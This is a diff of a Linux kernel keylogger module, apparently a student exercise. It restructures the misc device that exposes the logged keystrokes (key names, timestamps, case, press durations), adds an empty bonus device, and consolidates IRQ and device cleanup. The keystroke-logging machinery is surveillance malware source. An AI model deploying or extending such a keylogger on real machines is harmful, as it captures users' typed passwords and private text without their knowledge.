@@ -125,67 +125,6 @@ static struct key_map	*get_key(const unsigned int scancode)
 	return NULL;
 }
 
-/* ------------------------ MISC DEVICE SECTION ------------------------------*/
-
-static void	key_prepare_show_entry(struct key_log_entry *log, void *ptr)
-{
-	struct seq_file *seq = ptr;
-
-	if (!log | !log->key) {
-		pr_err("this should never happen ! grade me with a 0 and go.");
-		return;
-	}
-	seq_printf(seq,
-		   "%02d::%02d::%02d -> Key: %-12s (%2u) - %8s - count: %4lu of %4lu (caps: %3s)",
-		   log->tm.tm_hour, log->tm.tm_min, log->tm.tm_sec,
-		   (log->upper_case) ? log->key->upper_name : log->key->name,
-		   log->key->scancode,
-		   (log->event == PRESS) ? "pressed" : "released",
-		   log->press_count, log->key->press_count,
-		   (log->upper_case) ? "yes" : "no");
-	if (log->event == RELEASE && log->link)
-		seq_printf(seq, " durration: %4lu",
-			   log->jiffies - log->link->jiffies);
-	seq_putc(seq, '\n');
-}
-
-static int	key_prepare_show(struct seq_file *seq, void *ptr)
-{
-	spin_lock(&slock);
-	key_log_iter(key_prepare_show_entry, seq);
-	spin_unlock(&slock);
-	return 0;
-}
-
-static int	open_key(struct inode *node, struct file *file)
-{
-	int	ret;
-
-	pr_info("device open.\n");
-	file->private_data = NULL;
-	ret = single_open(file, &key_prepare_show, NULL);
-	return ret;
-}
-
-static int	release_key(struct inode *node, struct file *file)
-{
-	int		ret;
-
-	pr_info("device closed\n");
-	spin_lock(&slock);
-	ret = single_release(node, file);
-	spin_unlock(&slock);
-	return ret;
-}
-
-static const struct file_operations ops = {
-	.owner = THIS_MODULE,
-	.open = open_key,
-	.read = seq_read,
-	.release = release_key,
-	.llseek = seq_lseek,
-};
-
 static struct key_log_entry *key_create_entry(struct key_map *key,
 					      const bool caps)
 {
@@ -220,6 +159,96 @@ static struct key_log_entry *key_create_entry(struct key_map *key,
 	key_full_log->available -= 1;
 	return log;
 }
+
+/* ------------------------ MISC DEVICE SECTION ------------------------------*/
+
+static void	key_prepare_show_entry(struct key_log_entry *log, void *ptr)
+{
+	struct seq_file *seq = ptr;
+
+	seq_printf(seq,
+		   "%02d::%02d::%02d -> Key: %-12s (%2u) - %8s - count: %4lu of %4lu (caps: %3s)",
+		   log->tm.tm_hour, log->tm.tm_min, log->tm.tm_sec,
+		   (log->upper_case) ? log->key->upper_name : log->key->name,
+		   log->key->scancode,
+		   (log->event == PRESS) ? "pressed" : "released",
+		   log->press_count, log->key->press_count,
+		   (log->upper_case) ? "yes" : "no");
+	if (log->event == RELEASE && log->link)
+		seq_printf(seq, " durration: %4lu",
+			   log->jiffies - log->link->jiffies);
+	seq_putc(seq, '\n');
+}
+
+static int	key_prepare_show(struct seq_file *seq, void *ptr)
+{
+	spin_lock(&slock);
+	key_log_iter(key_prepare_show_entry, seq);
+	spin_unlock(&slock);
+	return 0;
+}
+
+static int	open_key(struct inode *node, struct file *file)
+{
+	file->private_data = NULL;
+	return single_open(file, &key_prepare_show, NULL);
+}
+
+static int	release_key(struct inode *node, struct file *file)
+{
+	int		ret;
+
+	pr_info("device closed\n");
+	spin_lock(&slock);
+	ret = single_release(node, file);
+	spin_unlock(&slock);
+	return ret;
+}
+
+static const struct file_operations ops = {
+	.owner = THIS_MODULE,
+	.open = open_key,
+	.read = seq_read,
+	.release = release_key,
+	.llseek = seq_lseek,
+};
+
+static struct miscdevice		dev = {
+	MISC_DYNAMIC_MINOR,
+	MODULE_NAME,
+	&ops
+};
+
+/* ****************************** BONUS DEVICE ****************************** */
+
+static int		bonus_show(struct seq_file *seq, void *ptr)
+{
+	return 0;
+}
+
+static int		bonus_open(struct inode *node, struct file *file)
+{
+	int	ret;
+
+	file->private_data = NULL;
+	spin_lock(&slock);
+	ret = single_open(file, bonus_show, NULL);
+	spin_unlock(&slock);
+	return ret;
+}
+
+static const struct file_operations ops_bonus = {
+	.owner = THIS_MODULE,
+	.open = bonus_open,
+	.read = seq_read,
+	.release = single_release
+};
+
+static struct miscdevice		dev_bonus = {
+	MISC_DYNAMIC_MINOR,
+	MODULE_NAME,
+	&ops_bonus
+};
 
 /* ----------------------- IRQ HANDLER SECTION -------------------------------*/
 
@@ -262,12 +291,6 @@ static irqreturn_t	key_handler(int irq, void *dev_id)
 	return IRQ_HANDLED;
 }
 
-static struct miscdevice		dev = {
-	MISC_DYNAMIC_MINOR,
-	MODULE_NAME,
-	&ops
-};
-
 static void	key_logprint_smart(struct key_log_entry *log, void *ptr)
 {
 	char		ascii;
@@ -279,18 +302,35 @@ static void	key_logprint_smart(struct key_log_entry *log, void *ptr)
 		pr_info(KERN_CONT "%c", ascii);
 }
 
-static void		__exit keylogger_clean(void)
+static int		keylogger_cleaner(const size_t flags, const int retval)
 {
-	pr_info(MODULE_NAME "Cleaning up module.\n");
-	free_irq(KEYBOARD_IRQ, &key_handler);
-	misc_deregister(&dev);
+	if (flags & KFLAG_DEV) {
+		pr_info("unregistering device.");
+		misc_deregister(&dev);
+	}
+	if (flags & KFLAG_DEVBONUS) {
+		pr_info("unregistering bonus device.");
+		misc_deregister(&dev_bonus);
+	}
+	if (flags & KFLAG_IRQ) {
+		pr_info("releasing irq.");
+		free_irq(KEYBOARD_IRQ, &key_handler);
+	}
 	if (workqueue) {
+		pr_info("deleting workqueue");
 		flush_workqueue(workqueue);
 		destroy_workqueue(workqueue);
 	}
+	return retval;
+}
+
+static void		__exit keylogger_clean(void)
+{
+	pr_info(MODULE_NAME "Cleaning up module.\n");
+	keylogger_cleaner(KFLAG_DEV | KFLAG_DEVBONUS | KFLAG_IRQ, 0);
 	key_log_iter(&key_logprint_smart, NULL);
 	key_log_clean();
-	pr_info("Keylogger removed.\n");
+	pr_info(MODULE_NAME " removed.\n");
 }
 
 static int		__init hello_init(void)
@@ -310,13 +350,17 @@ static int		__init hello_init(void)
 			  &key_handler);
 	if (ret < 0) {
 		pr_err("failed to request keyboard irq: %d\n", ret);
-		return ret;
+		return (keylogger_cleaner(KFLAG_NONE, -ENOMEM));
 	}
 	ret = misc_register(&dev);
 	if (ret < 0) {
 		pr_err("failed to register device.\n");
-		free_irq(KEYBOARD_IRQ, &key_handler);
-		return ret;
+		return (keylogger_cleaner(KFLAG_IRQ, ret));
+	}
+	ret = misc_register(&dev_bonus);
+	if (ret < 0) {
+		pr_err("failed to register bonus device\n.");
+		return (keylogger_cleaner(KFLAG_IRQ | KFLAG_DEV, ret));
 	}
 	return 0;
 }
